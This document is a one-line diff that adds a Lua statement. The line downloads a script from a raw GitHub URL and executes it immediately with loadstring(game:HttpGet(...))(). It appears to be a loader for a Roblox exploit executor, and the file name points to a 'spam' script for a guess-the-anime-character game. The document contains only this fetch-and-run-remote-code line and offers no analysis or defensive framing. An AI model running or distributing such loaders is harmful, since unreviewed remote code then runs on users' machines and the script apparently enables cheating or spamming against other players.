@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/2-player-guess-the-anime-character-spam6-nju1zic2ik7cqu.lua"))()
